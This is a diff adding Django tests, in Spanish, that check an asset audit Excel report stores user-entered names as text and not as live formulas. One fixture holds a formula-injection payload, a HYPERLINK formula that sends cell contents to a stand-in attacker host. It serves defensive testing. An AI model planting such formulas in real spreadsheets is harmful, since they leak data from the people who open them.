@@ -4,6 +4,7 @@ Cubren lo de alto valor: el corte al 30/09 recalcula dep/libros/estado a esa
 fecha, los activos iniciados despues del corte se excluyen, hay una hoja por
 categoria con su nombre, y la respuesta es un .xlsx descargable.
 """
+import zipfile
 from datetime import date
 from decimal import Decimal
 from io import BytesIO
@@ -198,3 +199,72 @@ class ReporteFinancieroTest(TenantTestCase):
         resp = self.client.get(
             '/api/reportes/financiero/?corte=2024', HTTP_HOST=self.host)
         self.assertEqual(resp.status_code, 400)
+
+
+class InyeccionFormulasAuditoriaTest(TenantTestCase):
+    """El nombre, la serie, la factura y los nombres de catalogo son texto libre
+    de cualquier usuario autenticado. openpyxl liga como formula viva todo
+    string que empiece con '=', asi que un activo bien nombrado ejecuta codigo
+    en la maquina de quien abra el reporte. Ninguna celda de estos libros debe
+    quedar escrita como formula."""
+
+    CARGA = '=HYPERLINK("https://evil.tld/?d="&A4,"Ver detalle")'
+
+    @classmethod
+    def setUpClass(cls):
+        super().setUpClass()
+        with tenant_context(cls.tenant):
+            cls.user = Usuario.objects.create_user(username='inj', password='secreta123')
+            # La categoria da el titulo A1 de la hoja: tambien es texto de usuario.
+            categoria = Categoria.objects.create(nombre='=1+1', prefijo='INJ')
+            loc = Localizacion.objects.create(nombre='Oficinas')
+            Activo.objects.create(
+                numero_activo='INJ-0001', nombre=cls.CARGA,
+                serie='@SUM(A1)', factura='+1+1',
+                costo_original=Decimal('1000000'), valor_libros_actual=Decimal('0'),
+                depreciacion_acumulada_actual=Decimal('0'),
+                fecha_adquisicion=date(2020, 1, 1), fecha_inicio=date(2020, 1, 1),
+                vida_util_anios=10, estado_depreciacion='DEPRECIANDO',
+                localizacion=loc, categoria=categoria,
+            )
+        cls.host = cls.tenant.get_primary_domain().domain
+
+    def setUp(self):
+        self.client = APIClient()
+        with tenant_context(self.tenant):
+            self.client.cookies['access'] = str(crear_refresh(self.user).access_token)
+
+    def _descargar(self):
+        resp = self.client.get('/api/reportes/auditoria/?anio=2024', HTTP_HOST=self.host)
+        self.assertEqual(resp.status_code, 200)
+        return resp.content
+
+    def _celda_del_activo(self, ws, columna):
+        fila = next(r for r in range(1, ws.max_row + 1)
+                    if ws.cell(row=r, column=1).value == 'INJ-0001')
+        return ws.cell(row=fila, column=columna)
+
+    def test_el_nombre_queda_como_texto_no_como_formula(self):
+        ws = load_workbook(BytesIO(self._descargar())).active
+        celda = self._celda_del_activo(ws, 2)   # columna 'Nombre'
+        self.assertEqual(celda.data_type, 's')
+        # El texto se conserva intacto: no se le agrega un apostrofo ni se recorta.
+        self.assertEqual(celda.value, self.CARGA)
+
+    def test_el_titulo_de_la_hoja_tampoco_queda_como_formula(self):
+        ws = load_workbook(BytesIO(self._descargar())).active
+        self.assertEqual(ws['A1'].data_type, 's')
+        self.assertEqual(ws['A1'].value, '=1+1')
+
+    def test_ninguna_celda_del_libro_se_escribe_como_formula(self):
+        # La prueba de fondo, sobre el XML crudo: si openpyxl hubiera ligado
+        # algo como formula habria un elemento <f> en la hoja. data_type puede
+        # mentir tras una recarga; el XML no.
+        contenido = self._descargar()
+        with zipfile.ZipFile(BytesIO(contenido)) as z:
+            hojas = [n for n in z.namelist() if n.startswith('xl/worksheets/')]
+            self.assertTrue(hojas)
+            for nombre in hojas:
+                xml = z.read(nombre).decode('utf-8')
+                self.assertNotIn('<f>', xml, f'{nombre} contiene una formula viva')
+                self.assertNotIn('<f ', xml, f'{nombre} contiene una formula viva')
